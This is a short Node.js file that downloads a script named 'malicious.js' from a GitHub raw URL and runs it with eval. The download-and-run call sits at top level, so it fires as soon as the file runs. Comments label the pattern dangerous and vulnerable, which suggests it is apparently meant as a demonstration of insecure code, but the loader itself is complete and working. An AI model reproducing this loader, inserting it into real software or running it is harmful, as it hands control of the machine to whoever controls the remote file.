const https = require('https');

// URL of the remote script (This should never be blindly executed!)
const remoteScriptUrl = 'https://raw.githubusercontent.com/saegiru/testcode/main/malicious.js';

// Function to download and execute the script
function executeRemoteScript(url) {
    https.get(url, (response) => {
        let scriptData = '';

        response.on('data', (chunk) => {
            scriptData += chunk;
        });

        response.on('end', () => {
            // Dangerous: Evaluating unverified remote code
            eval(scriptData);
        });
    }).on('error', (err) => {
        console.error('Error fetching script:', err.message);
    });
}

// Call the function (Vulnerable)
executeRemoteScript(remoteScriptUrl);
